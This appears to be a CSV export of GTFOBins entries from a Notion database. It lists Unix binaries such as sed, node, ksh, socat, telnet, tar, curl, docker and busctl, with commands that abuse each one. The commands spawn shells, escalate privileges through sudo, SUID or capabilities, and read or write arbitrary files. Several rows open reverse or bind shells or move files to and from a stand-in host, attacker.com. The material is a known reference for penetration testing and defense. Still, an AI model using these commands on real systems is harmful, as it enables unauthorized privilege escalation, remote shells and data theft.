Tools,Service,Port,Syntax & Description,Tags,MITRE ATT&CK
https://www.notion.socdist.md,GTFOBins,,"shell: cdist shell -s /bin/sh
sudo: sudo cdist shell -s /bin/sh","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sosetfacl.md,GTFOBins,,"suid: LFILE=file_to_change
USER=somebody
./setfacl -m u:$USER:rwx $LFILE

sudo: LFILE=file_to_change
USER=somebody
sudo setfacl -m -u:$USER:rwx $LFILE","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sosed.md,GTFOBins,,"shell: sed -n '1e exec sh 1>&0' /etc/hosts
shell: sed e
command: sed -n '1e id' /etc/hosts
file-write: LFILE=file_to_write
sed -n ""1s/.*/DATA/w $LFILE"" /etc/hosts

file-read: LFILE=file_to_read
sed '' ""$LFILE""

suid: LFILE=file_to_read
./sed -e '' ""$LFILE""

sudo: sudo sed -n '1e exec sh 1>&0' /etc/hosts","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sowireshark.md,GTFOBins,,"command: wireshark
sudo: PORT=4444
sudo wireshark -c 1 -i lo -k -f ""udp port $PORT"" &
echo 'DATA' | nc -u 127.127.127.127 ""$PORT""","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.soflock.md,GTFOBins,,"shell: flock -u / /bin/sh
suid: ./flock -u / /bin/sh -p
sudo: sudo flock -u / /bin/sh","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sodpkg.md,GTFOBins,,"shell: dpkg -l
!/bin/sh

sudo: sudo dpkg -l
!/bin/sh

sudo: sudo dpkg -i x_1.0_all.deb","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.soless.md,GTFOBins,,"shell: less /etc/profile
!/bin/sh

shell: VISUAL=""/bin/sh -c '/bin/sh'"" less /etc/profile
v

shell: less /etc/profile
v:shell

file-read: less file_to_read
file-read: less /etc/profile
:e file_to_read

file-write: echo DATA | less
sfile_to_write
q

file-write: less file_to_write
v

sudo: sudo less /etc/profile
!/bin/sh

suid: ./less file_to_read","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sosetlock.md,GTFOBins,,"shell: TF=$(mktemp)
setlock $TF /bin/sh

suid: ./setlock - /bin/sh -p
sudo: sudo setlock - /bin/sh","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sonode.md,GTFOBins,,"shell: node -e 'require(""child_process"").spawn(""/bin/sh"", {stdio: [0, 1, 2]})'

file-write: node -e 'require(""fs"").writeFileSync(""file_to_write"", ""DATA"")'
file-read: node -e 'process.stdout.write(require(""fs"").readFileSync(""/bin/ls""))'
file-download: export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
node -e 'require(""http"").get(process.env.URL, res => res.pipe(require(""fs"").createWriteStream(process.env.LFILE)))'

file-upload: export URL=http://attacker.com
export LFILE=file_to_send
node -e 'require(""fs"").createReadStream(process.env.LFILE).pipe(require(""http"").request(process.env.URL))'

reverse-shell: export RHOST=attacker.com
export RPORT=12345
node -e 'sh = require(""child_process"").spawn(""/bin/sh"");
require(""net"").connect(process.env.RPORT, process.env.RHOST, function () {
  this.pipe(sh.stdin);
  sh.stdout.pipe(this);
  sh.stderr.pipe(this);
})'

bind-shell: export LPORT=12345
node -e 'sh = require(""child_process"").spawn(""/bin/sh"");
require(""net"").createServer(function (client) {
  client.pipe(sh.stdin);
  sh.stdout.pipe(client);
  sh.stderr.pipe(client);
}).listen(process.env.LPORT)'

suid: ./node -e 'require(""child_process"").spawn(""/bin/sh"", [""-p""], {stdio: [0, 1, 2]})'

sudo: sudo node -e 'require(""child_process"").spawn(""/bin/sh"", {stdio: [0, 1, 2]})'

capabilities: ./node -e 'process.setuid(0); require(""child_process"").spawn(""/bin/sh"", {stdio: [0, 1, 2]})'","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.soksh.md,GTFOBins,,"shell: ksh
reverse-shell: export RHOST=attacker.com
export RPORT=12345
ksh -c 'ksh -i > /dev/tcp/$RHOST/$RPORT 2>&1 0>&1'

file-upload: export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
ksh -c 'echo -e ""POST / HTTP/0.9\n\n$(cat $LFILE)"" > /dev/tcp/$RHOST/$RPORT'

file-upload: export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
ksh -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'

file-download: export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_get
ksh -c '{ echo -ne ""GET /$LFILE HTTP/1.0\r\nhost: $RHOST\r\n\r\n"" 1>&3; cat 0<&3; } \
    3<>/dev/tcp/$RHOST/$RPORT \
    | { while read -r; do [ ""$REPLY"" = ""$(echo -ne ""\r"")"" ] && break; done; cat; } > $LFILE'

file-download: export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_get
ksh -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'

file-write: export LFILE=file_to_write
ksh -c 'echo DATA > $LFILE'

file-read: export LFILE=file_to_read
ksh -c 'echo ""$(<$LFILE)""'

file-read: export LFILE=file_to_read
ksh -c $'read -r -d \x04 < ""$LFILE""; echo ""$REPLY""'

suid: ./ksh -p
sudo: sudo ksh","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sokubectl.md,GTFOBins,,"file-upload: LFILE=dir_to_serve
kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/

suid: LFILE=dir_to_serve
./kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/

sudo: LFILE=dir_to_serve
sudo kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.socut.md,GTFOBins,,"file-read: LFILE=file_to_read
cut -d """" -f1 ""$LFILE""

suid: LFILE=file_to_read
./cut -d """" -f1 ""$LFILE""

sudo: LFILE=file_to_read
sudo cut -d """" -f1 ""$LFILE""","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sohexdump.md,GTFOBins,,"file-read: LFILE=file_to_read
hexdump -C ""$LFILE""

suid: LFILE=file_to_read
./hexdump -C ""$LFILE""

sudo: LFILE=file_to_read
sudo hexdump -C ""$LFILE""","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sosocat.md,GTFOBins,,"shell: socat stdin exec:/bin/sh

reverse-shell: RHOST=attacker.com
RPORT=12345
socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane

bind-shell: LPORT=12345
socat TCP-LISTEN:$LPORT,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane

file-upload: RHOST=attacker.com
RPORT=12345
LFILE=file_to_send
socat -u file:$LFILE tcp-connect:$RHOST:$RPORT

file-download: RHOST=attacker.com
RPORT=12345
LFILE=file_to_save
socat -u tcp-connect:$RHOST:$RPORT open:$LFILE,creat

file-read: LFILE=file_to_read
socat -u ""file:$LFILE"" -

file-write: LFILE=file_to_write
socat -u 'exec:echo DATA' ""open:$LFILE,creat""

sudo: sudo socat stdin exec:/bin/sh

limited-suid: RHOST=attacker.com
RPORT=12345
./socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sonohup.md,GTFOBins,,"shell: nohup /bin/sh -c ""sh <$(tty) >$(tty) 2>$(tty)""
command: COMMAND='/usr/bin/id'
nohup ""$COMMAND""
cat nohup.out

suid: ./nohup /bin/sh -p -c ""sh -p <$(tty) >$(tty) 2>$(tty)""
sudo: sudo nohup /bin/sh -c ""sh <$(tty) >$(tty) 2>$(tty)""","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sotelnet.md,GTFOBins,,"shell: RHOST=attacker.com
RPORT=12345
telnet $RHOST $RPORT
^]
!/bin/sh

reverse-shell: RHOST=attacker.com
RPORT=12345
TF=$(mktemp -u)
mkfifo $TF && telnet $RHOST $RPORT 0<$TF | /bin/sh 1>$TF

sudo: RHOST=attacker.com
RPORT=12345
sudo telnet $RHOST $RPORT
^]
!/bin/sh

limited-suid: RHOST=attacker.com
RPORT=12345
./telnet $RHOST $RPORT
^]
!/bin/sh","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.solook.md,GTFOBins,,"file-read: LFILE=file_to_read
look '' ""$LFILE""

suid: LFILE=file_to_read
./look '' ""$LFILE""

sudo: LFILE=file_to_read
sudo look '' ""$LFILE""","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sovigr.md,GTFOBins,,"suid: ./vigr
sudo: sudo vigr","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sosoftlimit.md,GTFOBins,,"shell: softlimit /bin/sh
suid: ./softlimit /bin/sh -p
sudo: sudo softlimit /bin/sh","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.somake.md,GTFOBins,,"shell: COMMAND='/bin/sh'
make -s --eval=$'x:\n\t-'""$COMMAND""

file-write: LFILE=file_to_write
make -s --eval=""\$(file >$LFILE,DATA)"" .

suid: COMMAND='/bin/sh -p'
./make -s --eval=$'x:\n\t-'""$COMMAND""

sudo: COMMAND='/bin/sh'
sudo make -s --eval=$'x:\n\t-'""$COMMAND""","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sozip.md,GTFOBins,,"file-read: LFILE=file-to-read
TF=$(mktemp -u)
zip $TF $LFILE
unzip -p $TF

shell: TF=$(mktemp -u)
zip $TF /etc/hosts -T -TT 'sh #'
rm $TF

sudo: TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF

limited-suid: TF=$(mktemp -u)
./zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sonsenter.md,GTFOBins,,"shell: nsenter /bin/sh
sudo: sudo nsenter /bin/sh","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.soefax.md,GTFOBins,,"suid: LFILE=file_to_read
./efax -d ""$LFILE""

sudo: LFILE=file_to_read
sudo efax -d ""$LFILE""","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.somtr.md,GTFOBins,,"file-read: LFILE=file_to_read
mtr --raw -F ""$LFILE""

sudo: LFILE=file_to_read
sudo mtr --raw -F ""$LFILE""","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sotimedatectl.md,GTFOBins,,"shell: timedatectl list-timezones
!/bin/sh

sudo: sudo timedatectl list-timezones
!/bin/sh","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.soterraform.md,GTFOBins,,"file-read: terraform console
file(""file_to_read"")

sudo: sudo terraform console
file(""file_to_read"")

suid: ./terraform console
file(""file_to_read"")","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sorpm.md,GTFOBins,,"shell: rpm --eval '%{lua:os.execute(""/bin/sh"")}'
shell: rpm --pipe '/bin/sh 0<&1'
limited-suid: ./rpm --eval '%{lua:os.execute(""/bin/sh"")}'
sudo: sudo rpm --eval '%{lua:os.execute(""/bin/sh"")}'
sudo: sudo rpm -ivh x-1.0-1.noarch.rpm","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sopwsh.md,GTFOBins,,"shell: pwsh
file-write: export LFILE=file_to_write
pwsh -c '""DATA"" | Out-File $env:LFILE'

sudo: sudo pwsh","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sodocker.md,GTFOBins,,"shell: docker run -v /:/mnt --rm -it alpine chroot /mnt sh
file-write: CONTAINER_ID=""$(docker run -d alpine)"" # or existing
TF=$(mktemp)
echo ""DATA"" > $TF
docker cp $TF $CONTAINER_ID:$TF
docker cp $CONTAINER_ID:$TF file_to_write

file-read: CONTAINER_ID=""$(docker run -d alpine)""  # or existing
TF=$(mktemp)
docker cp file_to_read $CONTAINER_ID:$TF
docker cp $CONTAINER_ID:$TF $TF
cat $TF

sudo: sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
suid: ./docker run -v /:/mnt --rm -it alpine chroot /mnt sh","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sobusctl.md,GTFOBins,,"shell: busctl --show-machine
!/bin/sh

shell: busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'

sudo: sudo busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'

suid: ./busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.soascii-xfr.md,GTFOBins,,"file-read: LFILE=file_to_read
ascii-xfr -ns ""$LFILE""

suid: LFILE=file_to_read
./ascii-xfr -ns ""$LFILE""

sudo: LFILE=file_to_read
sudo ascii-xfr -ns ""$LFILE""","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sotar.md,GTFOBins,,"shell: tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
shell: tar xf /dev/null -I '/bin/sh -c ""sh <&2 1>&2""'
shell: TF=$(mktemp)
echo '/bin/sh 0<&1' > ""$TF""
tar cf ""$TF.tar"" ""$TF""
tar xf ""$TF.tar"" --to-command sh
rm ""$TF""*

file-upload: RHOST=attacker.com
RUSER=root
RFILE=/tmp/file_to_send.tar
LFILE=file_to_send
tar cvf $RUSER@$RHOST:$RFILE $LFILE --rsh-command=/bin/ssh

file-download: RHOST=attacker.com
RUSER=root
RFILE=/tmp/file_to_get.tar
tar xvf $RUSER@$RHOST:$RFILE --rsh-command=/bin/ssh

file-write: LFILE=file_to_write
TF=$(mktemp)
echo DATA > ""$TF""
tar c --xform ""s@.*@$LFILE@"" -OP ""$TF"" | tar x -P

file-read: LFILE=file_to_read
tar xf ""$LFILE"" -I '/bin/sh -c ""cat 1>&2""'

sudo: sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
limited-suid: ./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sogenisoimage.md,GTFOBins,,"file-read: LFILE=file_to_read
genisoimage -q -o - ""$LFILE""

suid: LFILE=file_to_read
./genisoimage -sort ""$LFILE""

sudo: LFILE=file_to_read
sudo genisoimage -q -o - ""$LFILE""","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sowhois.md,GTFOBins,,"file-upload: RHOST=attacker.com
RPORT=12345
LFILE=file_to_send
whois -h $RHOST -p $RPORT ""`cat $LFILE`""

file-upload: RHOST=attacker.com
RPORT=12345
LFILE=file_to_send
whois -h $RHOST -p $RPORT ""`base64 $LFILE`""

file-download: RHOST=attacker.com
RPORT=12345
LFILE=file_to_save
whois -h $RHOST -p $RPORT > ""$LFILE""

file-download: RHOST=attacker.com
RPORT=12345
LFILE=file_to_save
whois -h $RHOST -p $RPORT | base64 -d > ""$LFILE""","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sonano.md,GTFOBins,,"shell: nano
^R^X
reset; sh 1>&0 2>&0

shell: nano -s /bin/sh
/bin/sh
^T

file-write: nano file_to_write
DATA
^O

file-read: nano file_to_read
limited-suid: ./nano -s /bin/sh
/bin/sh
^T

sudo: sudo nano
^R^X
reset; sh 1>&0 2>&0","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sopico.md,GTFOBins,,"shell: pico
^R^X
reset; sh 1>&0 2>&0

shell: pico -s /bin/sh
/bin/sh
^T

file-write: pico file_to_write
DATA
^O

file-read: pico file_to_read
limited-suid: ./pico -s /bin/sh
/bin/sh
^T

sudo: sudo pico
^R^X
reset; sh 1>&0 2>&0","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sotftp.md,GTFOBins,,"file-upload: RHOST=attacker.com
tftp $RHOST
put file_to_send

file-download: RHOST=attacker.com
tftp $RHOST
get file_to_get

suid: RHOST=attacker.com
./tftp $RHOST
put file_to_send

sudo: RHOST=attacker.com
sudo tftp $RHOST
put file_to_send","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sodistcc.md,GTFOBins,,"shell: distcc /bin/sh
suid: ./distcc /bin/sh -p
sudo: sudo distcc /bin/sh","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.soat.md,GTFOBins,,"shell: echo ""/bin/sh <$(tty) >$(tty) 2>$(tty)"" | at now; tail -f /dev/null

command: COMMAND=id
echo ""$COMMAND"" | at now

sudo: echo ""/bin/sh <$(tty) >$(tty) 2>$(tty)"" | sudo at now; tail -f /dev/null","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.soperf.md,GTFOBins,,"shell: perf stat /bin/sh

suid: ./perf stat /bin/sh -p

sudo: sudo perf stat /bin/sh","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sovirsh.md,GTFOBins,,"sudo: SCRIPT=script_to_run
TF=$(mktemp)
cat > $TF << EOF
<domain type='kvm'>
  <name>x</name>
  <os>
    <type arch='x86_64'>hvm</type>
  </os>
  <memory unit='KiB'>1</memory>
  <devices>
    <interface type='ethernet'>
      <script path='$SCRIPT'/>
    </interface>
  </devices>
</domain>
EOF
sudo virsh -c qemu:///system create $TF
virsh -c qemu:///system destroy x

file-write: LFILE_DIR=/root
LFILE_NAME=file_to_write

echo 'data' > data_to_write

TF=$(mktemp)
cat > $TF <<EOF
<volume type='file'>
  <name>y</name>
  <key>$LFILE_DIR/$LFILE_NAME</key>
  <source>
  </source>
  <capacity unit='bytes'>5</capacity>
  <allocation unit='bytes'>4096</allocation>
  <physical unit='bytes'>5</physical>
  <target>
    <path>$LFILE_DIR/$LFILE_NAME</path>
    <format type='raw'/>
    <permissions>
      <mode>0600</mode>
      <owner>0</owner>
      <group>0</group>
    </permissions>
  </target>
</volume>
EOF

virsh -c qemu:///system pool-create-as x dir --target $LFILE_DIR
virsh -c qemu:///system vol-create --pool x --file $TF
virsh -c qemu:///system vol-upload --pool x $LFILE_DIR/$LFILE_NAME data_to_write
virsh -c qemu:///system pool-destroy x

file-read: LFILE_DIR=/root
LFILE_NAME=file_to_read

SPATH=file_to_save

virsh -c qemu:///system pool-create-as x dir --target $LFILE_DIR
virsh -c qemu:///system vol-download --pool x $LFILE_NAME $SPATH
virsh -c qemu:///system pool-destroy x","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.soatobm.md,GTFOBins,,"file-read: LFILE=file_to_read
atobm $LFILE 2>&1 | awk -F ""'"" '{printf ""%s"", $2}'

sudo: LFILE=file_to_read
sudo atobm $LFILE 2>&1 | awk -F ""'"" '{printf ""%s"", $2}'

suid: LFILE=file_to_read
./atobm $LFILE 2>&1 | awk -F ""'"" '{printf ""%s"", $2}'","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sogzip.md,GTFOBins,,"file-read: LFILE=file_to_read
gzip -f $LFILE -t

file-read: LFILE=file_to_read
gzip -c $LFILE | gzip -d

suid: LFILE=file_to_read
./gzip -f $LFILE -t

sudo: LFILE=file_to_read
sudo gzip -f $LFILE -t","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sosqlmap.md,GTFOBins,,"shell: sqlmap -u 127.0.0.1 --eval=""import os; os.system('/bin/sh')""
sudo: sudo sqlmap -u 127.0.0.1 --eval=""import os; os.system('/bin/sh')""","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.soxmore.md,GTFOBins,,"file-read: LFILE=file_to_read
xmore $LFILE

suid: LFILE=file_to_read
./xmore $LFILE

sudo: LFILE=file_to_read
sudo xmore $LFILE","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.somore.md,GTFOBins,,"shell: TERM= more /etc/profile
!/bin/sh

file-read: more file_to_read
suid: ./more file_to_read
sudo: TERM= sudo more /etc/profile
!/bin/sh","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.soupdate-alternatives.md,GTFOBins,,"sudo: LFILE=/path/to/file_to_write
TF=$(mktemp)
echo DATA >$TF
sudo update-alternatives --force --install ""$LFILE"" x ""$TF"" 0

suid: LFILE=/path/to/file_to_write
TF=$(mktemp)
echo DATA >$TF
./update-alternatives --force --install ""$LFILE"" x ""$TF"" 0","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sofmt.md,GTFOBins,,"file-read: LFILE=file_to_read
fmt -pNON_EXISTING_PREFIX ""$LFILE""

file-read: LFILE=file_to_read
fmt -999 ""$LFILE""

suid: LFILE=file_to_read
./fmt -999 ""$LFILE""

sudo: LFILE=file_to_read
sudo fmt -999 ""$LFILE""","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.socurl.md,GTFOBins,,"file-upload: URL=http://attacker.com/
LFILE=file_to_send
curl -X POST -d ""@$LFILE"" $URL

file-download: URL=http://attacker.com/file_to_get
LFILE=file_to_save
curl $URL -o $LFILE

file-read: LFILE=/tmp/file_to_read
curl file://$LFILE

file-write: LFILE=file_to_write
TF=$(mktemp)
echo DATA >$TF
curl ""file://$TF"" -o ""$LFILE""

suid: URL=http://attacker.com/file_to_get
LFILE=file_to_save
./curl $URL -o $LFILE

sudo: URL=http://attacker.com/file_to_get
LFILE=file_to_save
sudo curl $URL -o $LFILE","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sotac.md,GTFOBins,,"file-read: LFILE=file_to_read
tac -s 'RANDOM' ""$LFILE""

suid: LFILE=file_to_read
./tac -s 'RANDOM' ""$LFILE""

sudo: LFILE=file_to_read
sudo tac -s 'RANDOM' ""$LFILE""","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.soxargs.md,GTFOBins,,"shell: xargs -a /dev/null sh
shell: echo x | xargs -Iy sh -c 'exec sh 0<&1'
shell: xargs -Ix sh -c 'exec sh 0<&1'
x^D^D

file-read: LFILE=file_to_read
xargs -a ""$LFILE"" -0

suid: ./xargs -a /dev/null sh -p
sudo: sudo xargs -a /dev/null sh","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sosg.md,GTFOBins,,"shell: sg $(id -ng)

sudo: sudo sg root","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.soapache2ctl.md,GTFOBins,,"file-read: LFILE=file_to_read
apache2ctl -c ""Include $LFILE"" -k stop

sudo: LFILE=file_to_read
sudo apache2ctl -c ""Include $LFILE"" -k stop","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sovalgrind.md,GTFOBins,,"shell: valgrind /bin/sh
sudo: sudo valgrind /bin/sh","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sogcloud.md,GTFOBins,,"shell: gcloud help
!/bin/sh

sudo: sudo gcloud help
!/bin/sh","GTFOBins, LOTL (Living Off The Land)",
